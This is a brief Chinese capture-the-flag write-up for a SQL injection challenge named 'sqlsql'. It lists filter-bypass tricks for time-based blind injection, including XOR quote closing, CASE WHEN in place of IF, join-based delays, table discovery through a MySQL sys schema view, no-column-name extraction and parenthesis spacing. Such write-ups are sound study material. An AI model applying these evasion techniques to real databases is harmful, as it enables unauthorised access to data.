2.sqlsql

需要注意的点(官方的wp)

  1. 用异或来闭合引号
  2. case when then else end来替代if
  3. 用join多个大表造成延时
  4. 通过mysql5.7的sys.schema_table_statistics_with_buffer表查询表名
  5. 通过无列名注入获取字段内容
  6. 通过括号，或者引号包裹来代替空格
  7. flllag表有两个字段且flag值在第二个字段
  8. 通过like或者regexp来匹配结果（但是这里不能用like，师傅们结合flag内容具体想想，卖个关子）

可以发现SQL语句，那应该是和SQL注入有关了。经过提示，大概率和盲注有关。

经过FUZZ，可以发现有如下的关键字被过滤了

其中空格可以用小括号来分割语句解决，逗号被过滤了所以if也无法使用，但是可以用case when then else end，information_schema被过滤，可以用sys.schema_table_statistics_with_buffer来代替。

同时可以用join多个大表来造成延迟注入。
